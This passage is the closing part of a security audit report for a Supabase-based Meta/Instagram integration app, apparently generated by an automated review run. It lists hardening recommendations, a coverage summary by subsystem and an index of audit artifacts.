- The diagnostics page calls checkMetaApiLatency() on every render, so any authenticated user can generate outbound Meta Graph API requests by reloading /dashboard/diagnostics; cache the probe or move it to a cron-written status row.
- The diagnostics page discloses deployment configuration state (whether META_APP_SECRET, META_VERIFY_TOKEN, CRON_SECRET, TOKEN_VAULT_SECRET and DATABASE_URL are set) to every authenticated user; consider limiting the configuration checks to admins.
- ChangePasswordForm relies on a client-side, fail-open rate limiter (lib/auth-guard.ts) and does not revoke other sessions after a password change; Supabase Auth is the only enforcement layer, so enable its reauthentication setting and consider signing out other sessions.
- The OAuth consent page navigates to data.redirect_url without a scheme assertion; add an https-only check as defense in depth even though the value comes from the Supabase OAuth server.
- Normalize the next parameter once at the source (as lib/supabase/proxy.ts does) so every consumer, including the sign-up form and the OAuth redirectTo, inherits the same-origin guarantee.

---

## 7. Coverage summary

| Status | Count | Meaning |
|---|---|---|
| covered | 21 | Reviewed with owned paths and checks; no candidate survived. |
| candidate | 23 | Reviewed and produced at least one candidate record. |
| blocked | 0 | Partial review with an unresolved blocker. |
| deferred | 1 | Not assigned before the final-clean stop. |
| planned | 0 | Seeded but never assigned. |

The one deferred unit is the documented 90-day retention for `comment_events`, `messages`, and `dm_logs`. It shares the same root cause as the covered `webhook_events` retention lead (a documented retention table with no enforcing job) and was not separately hunted before the final-clean critic stopped the run.

### Coverage by subsystem

| Subsystem | Units | Covered | Candidate | Deferred |
|---|---|---|---|---|
| `.` | 1 | 0 | 1 | 0 |
| `app/api/admin` | 2 | 1 | 1 | 0 |
| `app/api/analytics` | 1 | 1 | 0 | 0 |
| `app/api/auth` | 2 | 1 | 1 | 0 |
| `app/api/campaigns` | 1 | 0 | 1 | 0 |
| `app/api/contacts` | 1 | 0 | 1 | 0 |
| `app/api/cron` | 5 | 3 | 1 | 1 |
| `app/api/diagnostics` | 1 | 1 | 0 | 0 |
| `app/api/health` | 1 | 1 | 0 | 0 |
| `app/api/inbox` | 1 | 1 | 0 | 0 |
| `app/api/instagram` | 3 | 1 | 2 | 0 |
| `app/api/workers` | 1 | 0 | 1 | 0 |
| `app/auth` | 1 | 0 | 1 | 0 |
| `app/dashboard/diagnostics` | 1 | 0 | 1 | 0 |
| `app/oauth` | 1 | 1 | 0 | 0 |
| `app/onboarding` | 1 | 1 | 0 | 0 |
| `components` | 5 | 2 | 3 | 0 |
| `lib` | 2 | 0 | 2 | 0 |
| `lib/cloudflare` | 1 | 1 | 0 | 0 |
| `lib/conversions` | 1 | 1 | 0 | 0 |
| `lib/meta` | 10 | 4 | 6 | 0 |
| `lib/public-report` | 1 | 1 | 0 | 0 |
| `supabase/migrations` | 1 | 0 | 1 | 0 |

---

## 8. Appendix — artifact index

| File | Contents |
|---|---|
| `REPORT.md` | Short report: posture, confirmed table, needs-validation table, hardening, coverage. |
| `FINDINGS-DETAIL.md` | Full traces and reproductions for confirmed medium/high/critical findings. |
| `NEEDS-VALIDATION.md` | Prioritized leads with blockers and resolution plans. |
| `findings.json` | Machine-readable records, validated against `report-schema.json`. |
| `coverage-ledger.json` | Deterministic coverage ledger, validated by `validate-coverage-ledger.cjs`. |
| `architecture.md` | Trust-boundary and entry-surface summary. |
| `run-metadata.json` | Run profile, source ref, agent counts, status. |
| `agents/<id>/artifacts/check-output.json` | Promoted bounded-check outputs used as evidence. |

_Generated from the final validated records. The prose in this document does not change any verdict, severity, blocker, or demonstrated impact._